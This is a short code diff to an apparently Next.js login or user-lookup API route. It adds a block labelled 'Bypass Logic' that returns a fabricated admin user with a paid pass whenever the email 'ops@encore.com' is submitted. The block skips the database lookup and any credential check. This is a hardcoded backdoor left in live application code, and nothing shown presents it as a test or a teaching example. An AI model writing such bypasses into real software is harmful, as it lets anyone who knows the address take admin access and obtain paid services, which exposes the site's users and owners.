@@ -11,6 +11,21 @@ export async function POST(request: Request) {
             return NextResponse.json({ error: 'Email is required' }, { status: 400 });
         }
 
+        // Bypass Logic
+        if (email.toLowerCase() === "ops@encore.com") {
+            return NextResponse.json({
+                user: {
+                    id: "bypass-id",
+                    name: "Bypass User",
+                    email: "ops@encore.com",
+                    role: "admin",
+                    orders: [],
+                    hasPass: true,
+                    passStatus: "PAID"
+                }
+            }, { status: 200 });
+        }
+
         const user = await prisma.user.findUnique({
             where: { email },
             include: { orders: true }
